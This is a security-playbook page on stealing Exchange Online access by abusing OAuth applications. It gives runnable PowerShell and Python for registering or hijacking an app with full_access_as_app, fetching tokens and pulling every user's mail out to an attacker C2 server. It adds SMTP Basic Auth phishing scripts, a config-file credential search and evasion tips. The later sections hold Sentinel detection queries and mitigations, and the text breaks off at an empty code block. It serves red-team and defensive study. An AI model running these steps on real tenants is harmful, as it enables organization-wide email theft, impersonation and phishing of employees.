# [CA-TOKEN-011]: Exchange Online OAuth Token Theft

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-011 |
| **MITRE ATT&CK v18.1** | [T1528: Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/) and [T1114: Email Collection](https://attack.mitre.org/techniques/T1114/) |
| **Tactic** | Credential Access, Collection |
| **Platforms** | M365 (Exchange Online), Entra ID, Cross-Platform |
| **Severity** | **Critical** |
| **CVE** | N/A (OAuth design flaw, not formal vulnerability; related to Midnight Blizzard exploitation) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions:** | Exchange Online (all versions), Microsoft 365 (all versions), Entra ID (all versions) |
| **Patched In** | N/A (RBAC application impersonation deprecated May 2024; EWS OAuth enforced October 2026) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** This technique involves OAuth application compromise or malicious app creation to gain `full_access_as_app` permission on Exchange Online, allowing access to all user mailboxes via Exchange Web Services (EWS) without authentication. Historic SMTP Basic Auth exploitation is being deprecated (March-April 2026) in favor of OAuth. All sections renumbered based on applicability.

---

## 2. Executive Summary

Exchange Online is Microsoft's cloud-hosted email service that authenticates users and applications using OAuth 2.0. When an OAuth application is granted the `full_access_as_app` permission role, it gains the ability to access ALL user mailboxes in the organization via Exchange Web Services (EWS) without requiring the mailbox owner to authenticate. An attacker who compromises or creates such an OAuth application can read, delete, and forward emails for every user in the organization, establish persistence through email rules and forwarding, and exfiltrate sensitive organizational data.

Additionally, legacy SMTP Basic Authentication (username/password) has historically allowed compromised accounts or devices to send emails impersonating users, but Microsoft is deprecating Basic Auth for SMTP completely by April 30, 2026, forcing migration to OAuth-based authentication.

**Attack Surface**: OAuth applications with elevated permissions (`full_access_as_app`, `Mail.Read`, `Mail.ReadWrite` scopes); compromised service principal credentials; legacy SMTP Basic Auth accounts (until April 2026). Attackers can compromise applications through phishing, consent grant attacks, or direct compromise of service principal credentials stored in configuration files or environment variables.

**Business Impact**: **Complete access to organization-wide email, ability to read all messages, exfiltrate sensitive data, send emails impersonating any user, and establish persistent backdoor access through email forwarding rules and delegates**. An attacker can read confidential business deals, legal documents, HR records, financial data, and communication with external partners—all without triggering typical user notification mechanisms.

**Technical Context**: The Midnight Blizzard attack (January 2024) demonstrated this technique at scale, compromising a test OAuth application and using it to access Microsoft's own corporate emails. The attacker created additional OAuth applications and used residential proxies to mask their identity while accessing EWS. Modern Exchange Online no longer supports the highest-risk permission assignments (application impersonation role), but legacy organizations and applications may still have these permissions assigned. EWS itself will be deprecated in October 2026, but until then remains a valid and commonly used attack vector.

### Operational Risk

- **Execution Risk:** **High** – If an OAuth app is already compromised or can be created, the attack executes immediately with full access to organizational email.
- **Stealth:** **High** – EWS API calls from legitimate-looking OAuth applications are difficult to distinguish from normal application activity. Residential proxies used to obfuscate the source IP make IP-based detection infeasible.
- **Reversibility:** **No** – Once emails are exfiltrated or deleted, they cannot be recovered by the user. Forwarding rules and delegates can persist independently of the compromised application.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.1.1 / 18.2 | OAuth app governance; restrict high-risk permissions |
| **DISA STIG** | SRG-APP-000494-WSR-000062 | Multi-factor authentication for sensitive operations |
| **CISA SCuBA** | SC-7(8) / AC-6(1) | Cloud identity and access controls; least privilege |
| **NIST 800-53** | AC-3(15) / IA-5 | Access control for organizational data; credential management |
| **GDPR** | Article 32 | Security of processing; encryption of personal data in transit |
| **DORA** | Article 9 | Key management; authorized access controls |
| **NIS2** | Article 21 | Incident response and anomaly detection |
| **ISO 27001** | A.9.2.2 / A.14.2.3 | User provisioning and authentication; secure development |
| **ISO 27005** | Risk Scenario: "OAuth Application Compromise" | Access control and monitoring |

---

## 3. Technical Prerequisites

- **Required Privileges:** Access to create OAuth applications (app admin in Entra ID), or compromise of existing high-permission OAuth application credentials.
- **Required Access:** Network access to Azure endpoints; ability to authenticate with compromised application credentials or user MFA tokens.

**Supported Versions:**
- **Microsoft 365:** All current versions
- **Exchange Online:** All versions (EWS deprecated October 2026)
- **Entra ID:** All versions
- **PowerShell:** 5.0+ with ExchangeOnlineManagement module 3.0+

**Tools:**
- [Office 365 Management Activity API](https://learn.microsoft.com/en-us/office/office-365-management-api/office-365-management-activity-api-reference) (Monitor OAuth activity)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) (Programmatically manage apps)
- [ExchangeOnlineManagement PowerShell](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell) (EWS API calls)
- [Fiddler / Burp Suite](https://www.telerik.com/fiddler) (Monitor OAuth token usage)
- [Atomic Red Team - T1114](https://github.com/redcanaryco/atomic-red-team/) (Email collection tests)

---

## 4. Environmental Reconnaissance

### Management Station / PowerShell Reconnaissance

```powershell
# Check Exchange Online applications with elevated permissions
Connect-ExchangeOnline -UserPrincipalName admin@contoso.com

# List all OAuth applications with ApplicationImpersonation role
Get-ManagementRoleAssignment -Role "ApplicationImpersonation" -GetEffectiveUsers

# Identify apps with full_access_as_app permission (Midnight Blizzard indicator)
$AppId = "00000002-0000-0ff1-ce00-000000000000"  # Exchange Online app ID
Get-ServicePrincipal | Where-Object {
    $_.ServicePrincipalId -in (Get-MgServicePrincipalAppRoleAssignment).ResourceId
} | Select-Object DisplayName, AppId, ServicePrincipalId

# Check for suspicious EWS access patterns
$EWSLogs = Get-MailboxAuditBypassAssociation
$EWSLogs | Where-Object { $_.AuditBypassEnabled -eq $true } | Select-Object Identity
```

**What to Look For:**
- OAuth applications with `ApplicationImpersonation` or `full_access_as_app` roles assigned.
- Service principals with broad mailbox access permissions.
- Audit bypass enabled for any accounts or applications (indicates attacker persistence).

---

### Entra ID / PowerShell Reconnaissance

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.Read.All", "RoleManagement.Read.Directory"

# List all OAuth applications in the tenant
Get-MgApplication | Select-Object DisplayName, AppId, PublisherName | Format-Table

# Check for malicious or suspicious OAuth app permissions
Get-MgServicePrincipal -Filter "servicePrincipalType eq 'Application'" | 
    ForEach-Object {
        Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $_.Id | 
            Where-Object { $_.AppRoleId -eq "dc890d15-9560-4a4c-9b7f-a736ec74ec40" }  # full_access_as_app GUID
    }

# List recently created applications (potential backdoors)
Get-MgApplication | Where-Object { $_.CreatedDateTime -gt (Get-Date).AddDays(-30) } | 
    Select-Object DisplayName, CreatedDateTime, AppId
```

**What to Look For:**
- Recently created applications (last 30 days) that have not been audited.
- Applications with `full_access_as_app` or similar high-privilege permissions.
- Applications with odd publisher names or display names.

---

## 5. Detailed Execution Methods

### METHOD 1: OAuth Application Compromise and EWS Access

**Supported Versions:** Exchange Online all versions, Entra ID all versions

#### Step 1: Identify or Create Malicious OAuth Application

**Objective:** Either compromise an existing OAuth application with elevated permissions or create a new malicious application.

**Command (PowerShell - Create Malicious OAuth App):**

```powershell
# Register a new OAuth application in Entra ID
Connect-MgGraph -Scopes "Application.ReadWrite.All"

$AppParams = @{
    DisplayName         = "Exchange Integration Manager"  # Legitimate-sounding name
    PublicClient        = $false
    RequiredResourceAccess = @(
        @{
            ResourceAppId = "00000002-0000-0ff1-ce00-000000000000"  # Exchange Online
            ResourceAccess = @(
                @{
                    Id   = "dc890d15-9560-4a4c-9b7f-a736ec74ec40"  # full_access_as_app
                    Type = "Role"
                }
            )
        }
    )
    Web = @{
        RedirectUris = @("http://localhost:3000", "https://attacker.com/callback")
    }
}

$OAuthApp = New-MgApplication @AppParams
$AppId = $OAuthApp.AppId
Write-Host "[+] OAuth App created: $AppId"

# Create a client secret for authentication
$SecretParams = @{
    ServicePrincipalId = (Get-MgServicePrincipal -Filter "appId eq '$AppId'").Id
}

$ClientSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $SecretParams.ServicePrincipalId
Write-Host "[+] Client Secret: $($ClientSecret.SecretText)"
```

**Command (PowerShell - Compromise Existing OAuth App):**

```powershell
# If application already exists and is compromised, rotate its secret
$AppId = "compromised-app-id"
$ServicePrincipalId = (Get-MgServicePrincipal -Filter "appId eq '$AppId'").Id

# Remove old secrets
Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $ServicePrincipalId | 
    Remove-MgServicePrincipalPassword -ServicePrincipalId $ServicePrincipalId

# Add new secret owned by attacker
$NewSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $ServicePrincipalId
Write-Host "[+] New Client Secret: $($NewSecret.SecretText)"
```

**Expected Output:**

```
[+] OAuth App created: 11111111-2222-3333-4444-555555555555
[+] Client Secret: super_secret_client_secret_value_here
```

**What This Means:**
- A malicious OAuth application has been created (or an existing one compromised).
- The application has `full_access_as_app` permission to access all Exchange mailboxes.
- The attacker now has a client secret to authenticate as this application.

**OpSec & Evasion:**
- Use legitimate-sounding application names ("Exchange Sync Manager", "O365 Backup Tool").
- Register the app in a test/non-production tenant first to avoid suspicion.
- Use legitimate-looking callback URLs or configure without redirect URIs for backend-only usage.
- Detection Likelihood: **Medium** (Entra ID logs all app registrations and permission grants; advanced organizations monitor for `full_access_as_app` assignments).

---

#### Step 2: Grant Admin Consent to Full_Access_As_App Permission

**Objective:** Obtain admin consent for the `full_access_as_app` permission, which is required for the app to access all mailboxes.

**Command (PowerShell - Grant Admin Consent):**

```powershell
# Get the service principal for the OAuth app
$ServicePrincipalId = (Get-MgServicePrincipal -Filter "appId eq '$AppId'").Id

# Get the Exchange Online service principal ID
$ExchangeServicePrincipalId = (Get-MgServicePrincipal -Filter "displayName eq 'Office 365 Exchange Online'").Id

# Assign the full_access_as_app role to the OAuth app
$RoleDefinition = @{
    AppRoleId = "dc890d15-9560-4a4c-9b7f-a736ec74ec40"  # full_access_as_app
    PrincipalType = "ServicePrincipal"
    PrincipalId = $ServicePrincipalId
    ResourceId = $ExchangeServicePrincipalId
}

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $ExchangeServicePrincipalId @RoleDefinition

Write-Host "[+] full_access_as_app role assigned to OAuth app"
```

**Alternative Method (Admin Consent Screen):**

```powershell
# If you have a user account with admin rights, trigger admin consent via OAuth flow
$TenantId = "contoso.onmicrosoft.com"
$AppId = "11111111-2222-3333-4444-555555555555"

$ConsentURL = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/authorize?client_id=$AppId&redirect_uri=http://localhost:3000&response_type=code&scope=.default&prompt=admin_consent"

Write-Host "Open this URL and click 'Accept' to grant admin consent:"
Write-Host $ConsentURL
```

**Expected Output:**

```
[+] full_access_as_app role assigned to OAuth app
```

**What This Means:**
- The OAuth application now has permission to access all user mailboxes in Exchange Online.
- No individual user authorization is required; the app can access any mailbox.
- The permission will persist even if the user who granted consent is deleted.

**OpSec & Evasion:**
- If an attacker doesn't have global admin rights, they can try to social engineer an admin to grant consent via the admin consent flow.
- Alternatively, if the attacker has compromised a legacy test account without MFA, they can use that account to trigger consent.
- Detection Likelihood: **Very High** (Entra ID audit logs all permission assignments; Microsoft Sentinel has built-in detection for `full_access_as_app` grants).

---

#### Step 3: Authenticate as OAuth App and Access EWS

**Objective:** Use the OAuth application credentials to obtain an access token for Exchange Online.

**Command (PowerShell - Get OAuth Token):**

```powershell
# OAuth token endpoint
$TokenURL = "https://login.microsoftonline.com/contoso.onmicrosoft.com/oauth2/v2.0/token"

# OAuth app credentials
$ClientId = "11111111-2222-3333-4444-555555555555"
$ClientSecret = "super_secret_client_secret_value_here"
$TenantId = "contoso.onmicrosoft.com"

# Request access token
$Body = @{
    grant_type    = "client_credentials"
    client_id     = $ClientId
    client_secret = $ClientSecret
    scope         = "https://outlook.office365.com/.default"
}

$TokenResponse = Invoke-RestMethod -Uri $TokenURL -Method POST -Body $Body -ContentType "application/x-www-form-urlencoded"
$AccessToken = $TokenResponse.access_token

Write-Host "[+] Access Token obtained (expires in $($TokenResponse.expires_in) seconds)"
Write-Host "[+] Token: $($AccessToken.Substring(0, 50))..."
```

**Expected Output:**

```
[+] Access Token obtained (expires in 3600 seconds)
[+] Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJodH...
```

**What This Means:**
- A valid OAuth access token has been obtained for the Exchange Online service.
- The token grants full access to all mailboxes via EWS.
- The token is valid for 1 hour (3600 seconds).

**OpSec & Evasion:**
- The token request is made directly to Microsoft's OAuth endpoint, generating minimal suspicious activity.
- Once obtained, tokens should be stored in memory or encrypted at rest.
- Detection Likelihood: **Low** (Outbound HTTPS to login.microsoftonline.com is normal for any M365 application).

---

#### Step 4: Use EWS API to Access and Exfiltrate Emails

**Objective:** Use the OAuth token to access mailboxes via EWS and exfiltrate emails.

**Command (PowerShell - List All Mailboxes and Read Emails):**

```powershell
# EWS API endpoint
$EWSEndpoint = "https://outlook.office365.com/EWS/Exchange.asmx"

# Prepare authorization header with OAuth token
$Headers = @{
    "Authorization" = "Bearer $AccessToken"
    "Content-Type"  = "application/soap+xml"
}

# SOAP request to list all mailboxes (using full_access_as_app capability)
$SOAPBody = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
    <soap:Header>
        <t:RequestServerVersion Version="Exchange2016"/>
    </soap:Header>
    <soap:Body>
        <t:GetFolder>
            <t:FolderIds>
                <t:DistinguishedFolderId Id="inbox"/>
            </t:FolderIds>
            <t:FolderShape>
                <t:BaseShape>AllProperties</t:BaseShape>
            </t:FolderShape>
        </t:GetFolder>
    </soap:Body>
</soap:Envelope>
"@

# Make EWS API call
$Response = Invoke-RestMethod -Uri $EWSEndpoint -Method POST -Headers $Headers -Body $SOAPBody

# Parse and display results
Write-Host "[+] Mailbox Inbox accessed successfully"
Write-Host "[+] Response: $($Response | ConvertTo-Json)"
```

**Command (Python - Bulk Email Exfiltration):**

```python
#!/usr/bin/env python3
import requests
from exchangelib import Account, Configuration, OAuth2Credentials, DELEGATE

# OAuth credentials
client_id = "11111111-2222-3333-4444-555555555555"
client_secret = "super_secret_client_secret_value_here"
tenant_id = "contoso.onmicrosoft.com"
access_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."  # From Step 3

# Enumerate all users in the organization
# Using Microsoft Graph API with the OAuth token
graph_url = "https://graph.microsoft.com/v1.0/users"
headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

response = requests.get(graph_url, headers=headers)
users = response.json()['value']

print(f"[+] Found {len(users)} users in organization")

# For each user, attempt to access their mailbox via EWS
for user in users:
    user_email = user.get('userPrincipalName')
    if user_email:
        print(f"[+] Accessing mailbox: {user_email}")
        
        # Use ExchangeLib library to connect as the OAuth app
        # and access the user's mailbox with full_access_as_app
        try:
            config = Configuration(
                server='outlook.office365.com',
                credentials=OAuth2Credentials(
                    client_id=client_id,
                    client_secret=client_secret,
                    tenant_id=tenant_id,
                    auth_url='https://login.microsoftonline.com',
                ),
                auth_type=DELEGATE,
            )
            
            account = Account(
                primary_smtp_address=user_email,
                config=config,
                autodiscover=False,
            )
            
            # Access inbox and exfiltrate emails
            for email in account.inbox.all():
                print(f"  From: {email.sender.email_address}")
                print(f"  Subject: {email.subject}")
                print(f"  Body (first 200 chars): {email.body[:200]}")
                print("---")
                
                # Save emails to attacker's server
                exfiltrate_email(email, attacker_c2_server)
        
        except Exception as e:
            print(f"[-] Error accessing {user_email}: {e}")
```

**Expected Output:**

```
[+] Mailbox Inbox accessed successfully
[+] Found 5000 users in organization
[+] Accessing mailbox: user1@contoso.com
  From: external.partner@example.com
  Subject: Q1 2025 Financial Results - CONFIDENTIAL
  Body (first 200 chars): The Q1 2025 results show a 15% increase in revenue driven by...
---
[+] Accessing mailbox: user2@contoso.com
  From: legal@contoso.com
  Subject: Merger Acquisition Details - CONFIDENTIAL
  ...
```

**What This Means:**
- The attacker now has complete access to all user mailboxes in the organization.
- Sensitive emails have been exfiltrated.
- The attacker can read financial data, legal documents, HR records, and communications with external partners.

**OpSec & Evasion:**
- EWS API calls from legitimate-looking OAuth applications blend in with normal application activity.
- Use residential proxies to obfuscate the source IP (Midnight Blizzard technique).
- Perform bulk email access during business hours when API activity is high.
- Detection Likelihood: **Medium-High** (Exchange Online logs all EWS API calls; Microsoft Sentinel can detect anomalous mailbox access patterns).

---

### METHOD 2: SMTP Basic Auth Abuse (Deprecated, will end April 2026)

**Supported Versions:** Exchange Online (until April 30, 2026), applicable to any device/application using SMTP AUTH

#### Step 1: Obtain or Create Compromised Account Credentials

**Objective:** Obtain SMTP credentials (username/password) for an account in the organization.

**Command (PowerShell - Extract SMTP Creds from Configuration Files):**

```powershell
# Search for SMTP credentials hardcoded in config files
$SearchPaths = @(
    "C:\Program Files\",
    "C:\Program Files (x86)\",
    "C:\Users\*\Documents\",
    "C:\Users\*\Desktop\"
)

foreach ($Path in $SearchPaths) {
    Get-ChildItem -Path $Path -Recurse -Include "*.config", "*.txt", "*.ps1", "*.json" -ErrorAction SilentlyContinue |
        Select-String -Pattern "smtp.*password|smtp.*credential|SMTP.*AUTH" -ErrorAction SilentlyContinue |
        Select-Object Filename, Line
}
```

**Alternative: Compromise User Account via Phishing**

```powershell
# Or, use compromised credentials obtained via phishing
$SMTPUser = "compromised.user@contoso.com"
$SMTPPassword = "P@ssw0rd123!"
$SMTPServer = "smtp.office365.com"
$SMTPPort = 587
```

---

#### Step 2: Send Email via SMTP AUTH (Basic Auth)

**Objective:** Use SMTP Basic Auth to send emails on behalf of the compromised account.

**Command (PowerShell - Send Email via SMTP Basic Auth):**

```powershell
# SMTP credentials
$SMTPUser = "compromised.user@contoso.com"
$SMTPPassword = "P@ssw0rd123!"
$SMTPServer = "smtp.office365.com"
$SMTPPort = 587

# Convert password to secure string
$SecurePassword = ConvertTo-SecureString $SMTPPassword -AsPlainText -Force
$Credential = New-Object PSCredential($SMTPUser, $SecurePassword)

# Prepare phishing email
$EmailParams = @{
    From       = $SMTPUser
    To         = "executive@contoso.com"
    Subject    = "Urgent: Board Meeting Rescheduled"
    Body       = "The board meeting has been rescheduled to tomorrow at 2 PM. Please confirm attendance."
    SmtpServer = $SMTPServer
    Port       = $SMTPPort
    UseSsl     = $true
    Credential = $Credential
}

# Send the phishing email
Send-MailMessage @EmailParams

Write-Host "[+] Phishing email sent successfully from $SMTPUser"
```

**Command (Python/Bash - Send Email via SMTP):**

```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# SMTP credentials
smtp_user = "compromised.user@contoso.com"
smtp_password = "P@ssw0rd123!"
smtp_server = "smtp.office365.com"
smtp_port = 587

# Create email
msg = MIMEMultipart()
msg['From'] = smtp_user
msg['To'] = "executive@contoso.com"
msg['Subject'] = "Urgent: Board Meeting Rescheduled"

body = "The board meeting has been rescheduled to tomorrow at 2 PM. Please confirm attendance."
msg.attach(MIMEText(body, 'plain'))

# Send via SMTP
try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_user, smtp_password)
    server.send_message(msg)
    server.quit()
    print("[+] Phishing email sent successfully from", smtp_user)
except Exception as e:
    print(f"[-] Error sending email: {e}")
```

**Expected Output:**

```
[+] Phishing email sent successfully from compromised.user@contoso.com
```

**What This Means:**
- An email has been sent on behalf of the compromised user.
- The recipient sees the email as coming from the trusted internal user.
- This can be used for business email compromise (BEC), internal phishing, or establishing persistence via mail rules.

**Note: Deprecation Timeline**
- **March 1, 2026:** Microsoft begins rejecting a small percentage of SMTP Basic Auth requests
- **April 30, 2026:** 100% rejection of SMTP Basic Auth for Client Submission (SMTP AUTH)
- **After April 30, 2026:** Applications using SMTP Basic Auth will receive error: "550 5.7.30 Basic authentication is not supported for Client Submission"

---

## 6. Atomic Red Team

**Atomic Test ID:** T1114-002 (Email Collection: Remote Email Collection) / T1114-003 (Email Forwarding Rule)

**Test Name:** Office 365 – Remote Mail Collection via OAuth; Create Email Forwarding Rule

**Description:** Simulates compromised OAuth app accessing mailboxes via EWS and creating email forwarding rules for persistence.

**Supported Versions:** Exchange Online all versions, PowerShell 5.0+

**Execution:**

```powershell
# Step 1: Install Atomic Red Team
$AtomicPath = "C:\temp\atomic-red-team"
git clone https://github.com/redcanaryco/atomic-red-team $AtomicPath

cd "$AtomicPath\atomics\T1114"

# Step 2: Execute T1114-002 (Remote Email Collection)
Invoke-AtomicTest T1114 -TestNumbers 2 -Verbose

# Step 3: Execute T1114-003 (Email Forwarding Rule)
Invoke-AtomicTest T1114 -TestNumbers 3 -Verbose
```

**Cleanup Command:**

```powershell
# Remove email forwarding rules created during test
Get-InboxRule | Where-Object { $_.Name -like "*Test*" } | Remove-InboxRule -Confirm:$false

# Revoke OAuth app access (if test created an app)
# Requires Azure AD admin role
Get-MgServicePrincipal | Where-Object { $_.DisplayName -like "*Test*" } | Remove-MgServicePrincipal
```

**Reference:** [Atomic Red Team T1114 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/T1114.md)

---

## 7. Tools & Commands Reference

### [ExchangeOnlineManagement PowerShell Module](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell)

**Version:** 3.0+  
**Supported Platforms:** Windows, Linux, macOS  
**Minimum Version:** 2.0  

**Installation:**

```powershell
Install-Module -Name ExchangeOnlineManagement -Repository PSGallery -Force -AllowClobber
```

**Usage:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName admin@contoso.com

# List mailboxes
Get-Mailbox

# Search mailbox content
Search-Mailbox -Identity user@contoso.com -SearchQuery "password OR credential" -TargetMailbox archivemailbox@contoso.com

# Create forwarding rule (attacker perspective)
New-InboxRule -Name "Archive" -From * -MoveToFolder "Deleted Items"
```

### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation)

**Version:** 2.0+  
**Supported Platforms:** Windows, Linux, macOS  

**Installation:**

```powershell
Install-Module Microsoft.Graph -Repository PSGallery
```

**Usage:**

```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All", "RoleManagement.Read.Directory"

# List OAuth applications
Get-MgApplication

# Check app permissions
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $ServicePrincipalId
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect full_access_as_app Permission Assignment

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Entra ID all versions, Exchange Online all versions

**KQL Query:**

```kusto
AuditLogs
| where LoggedByService =~ "Core Directory"
| where Category =~ "ApplicationManagement"
| where OperationName =~ "Consent to application" or OperationName =~ "Update application."
| where TargetResources has "full_access_as_app" or TargetResources has "dc890d15-9560-4a4c-9b7f-a736ec74ec40"
| mv-expand TargetResources
| extend AppName = TargetResources.displayName
| extend Permissions = TargetResources.modifiedProperties
| extend GrantedBy = InitiatedBy.user.userPrincipalName
| project TimeGenerated, AppName, Permissions, GrantedBy, InitiatedBy, TargetResources
| where isnotempty(GrantedBy) or isnotempty(InitiatedBy.app.displayName)
```

**What This Detects:**
- Assignment of `full_access_as_app` permission to OAuth applications.
- Consent operations granting broad Exchange mailbox access.
- Permissions granted to suspicious applications.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Critical: full_access_as_app Permission Assigned to Application`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste the KQL query
   - Run query every: `5 minutes`
   - Lookup data from last: `24 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

### KQL Query 2: Detect Anomalous EWS API Activity

**Rule Configuration:**
- **Required Table:** MailboxAuditLogs, OfficeActivity
- **Required Fields:** Operation, UserId, SourceIPAddress, LogonType
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes

**KQL Query:**

```kusto
OfficeActivity
| where OfficeWorkload == "Exchange"
| where Operation in ("GetDelegate", "ExternalRecipientTips", "Set-Mailbox", "New-InboxRule", "Set-InboxRule")
| where LogonUserSid != "" or AppId != ""  // Service principal or app activity
| where not(UserId has_any ("svc_", "srv_", "app_"))  // Exclude known service accounts
| summarize AccessCount = count(), TargetMailboxes = dcount(MailboxOwnerMasterAccountSid) by UserId, AppId, SourceIPAddress
| where AccessCount > 100 or TargetMailboxes > 5
```

**What This Detects:**
- Bulk mailbox access via EWS from OAuth applications.
- Service principals accessing large numbers of mailboxes.
- Unusual API operations like inbox rules being created programmatically.

---

## 9. Windows Event Log Monitoring

**Event ID: 4625 (Failed Logon)**, **Event ID: 4768 (Kerberos Authentication Ticket Requested)**

For Exchange Online, monitoring is primarily cloud-based via Azure audit logs rather than Windows event logs. However, on-premises Exchange servers may generate relevant logs:

- **Log Source:** Exchange Server: MSExchange Management
- **Trigger:** EWS API calls from unusual service principals; bulk mailbox access
- **Filter:** EventID = 4768 AND ClientProcessName contains "EWS"

**Manual Configuration Steps (Group Policy - On-Premises Exchange):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Logon**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 10. Microsoft Defender for Cloud

**Alert Name:** `Suspicious modification to mailbox delegation settings detected`

- **Severity:** High
- **Description:** EDR/MDC detected unusual mailbox access patterns or delegation rule creation.
- **Applies To:** All M365 subscriptions with Defender for Cloud enabled
- **Remediation:**
  1. Immediately revoke OAuth app permissions
  2. Audit all mailboxes for forwarding rules
  3. Revoke suspicious delegates
  4. Force password reset for all users
  5. Enable MFA organization-wide

**Manual Configuration Steps:**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select subscription
4. Under **Defender plans**, enable:
   - **Defender for Cloud Apps**: ON
   - **Defender for Identity**: ON
5. Configure **Alert Settings** for mailbox access anomalies
6. Click **Save**

---

## 11. Microsoft Purview (Unified Audit Log)

**Operation:** `New-InboxRule`, `Set-InboxRule`, `Set-Mailbox`, `Add-MailboxDelegate`

**PowerShell Query:**

```powershell
Connect-ExchangeOnline

# Search for suspicious mailbox rules created by OAuth apps
Search-UnifiedAuditLog -Operations "New-InboxRule", "Set-InboxRule" -StartDate (Get-Date).AddDays(-7) | 
    Where-Object { $_.UserId -like "*\#EXT\#*" -or $_.ClientIP -eq "ServiceToPrincipal" } | 
    Export-Csv -Path "C:\Audit\Suspicious_Rules.csv"

# Search for delegate access changes
Search-UnifiedAuditLog -Operations "Add-MailboxDelegate", "Remove-MailboxDelegate" -StartDate (Get-Date).AddDays(-1) | 
    Export-Csv -Path "C:\Audit\Delegate_Changes.csv"

# Search for mailbox exports (data exfiltration indicator)
Search-UnifiedAuditLog -Operations "Export-Mailbox" -StartDate (Get-Date).AddDays(-7) | 
    Export-Csv -Path "C:\Audit\Mailbox_Exports.csv"
```

- **Operation:** `New-InboxRule`, `Set-InboxRule`, `Get-Mailbox`, `Export-Mailbox`, `New-MailboxExportRequest`
- **Workload:** Exchange
- **Details:** AuditData blob contains:
  - `UserId`: Account performing operation
  - `ClientIP`: Source IP address
  - `Operation`: Specific action (New-InboxRule, Set-Mailbox)
  - `MailboxOwner`: Target mailbox
  - `Parameters`: Rule details (forwarding address, etc.)
- **Applies To:** All M365 organizations with auditing enabled

---

## 12. Defensive Mitigations

### Priority 1: CRITICAL

**Mitigation 1: Restrict OAuth Application Permissions**

Prevent assignments of `full_access_as_app` role to applications.

**Applies To Versions:** Entra ID, Exchange Online (all versions)

**Manual Steps (PowerShell):**

```powershell
# List all apps with full_access_as_app role
Get-MgServicePrincipal | Where-Object {
    $AppId = $_.Id
    (Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $AppId | 
        Where-Object { $_.AppRoleId -eq "dc890d15-9560-4a4c-9b7f-a736ec74ec40" }).Count -gt 0
} | Select-Object DisplayName, AppId

# Remove full_access_as_app role from app
Remove-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $ServicePrincipalId -AppRoleAssignmentId $AssignmentId
```

**Manual Steps (Entra ID Admin Center):**

1. Navigate to **Entra ID** → **Enterprise Applications**
2. Search for application with full_access_as_app
3. Go to **App roles assigned** (or **Permissions**)
4. Click **Remove assignment** for `full_access_as_app`

---

**Mitigation 2: Enable Conditional Access for OAuth Apps**

Restrict OAuth application access based on device compliance, location, and risk.

**Manual Steps:**

1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Create **New Policy**:
   - Name: `Block OAuth Apps from Non-Compliant Devices`
   - Users: **All users**
   - Cloud apps: **Office 365 Exchange Online**
   - Conditions: **Client apps** = **Mobile and desktop clients**
3. **Grant Access**:
   - Require **device to be marked as compliant**
4. Enable policy: **On**

---

**Mitigation 3: Disable SMTP Basic Auth (Proactive for Post-April 2026)**

Organizations should begin migration to OAuth-based SMTP immediately.

**Manual Steps (PowerShell - Identify Basic Auth Usage):**

```powershell
# Check which clients are using Basic Auth for SMTP
Get-SMTPClientReport -SendSummary -Earliest -30days -SendFromMailbox all@contoso.onmicrosoft.com
```

**Manual Steps (Migration to OAuth):**

1. Update all devices/applications to support OAuth 2.0
2. Create Azure Communication Services Email or use High Volume Email service
3. Disable Basic Auth enforcement per application

---

### Priority 2: HIGH

**Mitigation 4: Audit and Monitor OAuth Application Consent**

Review all granted permissions and remove unnecessary applications.

**Manual Steps:**

```powershell
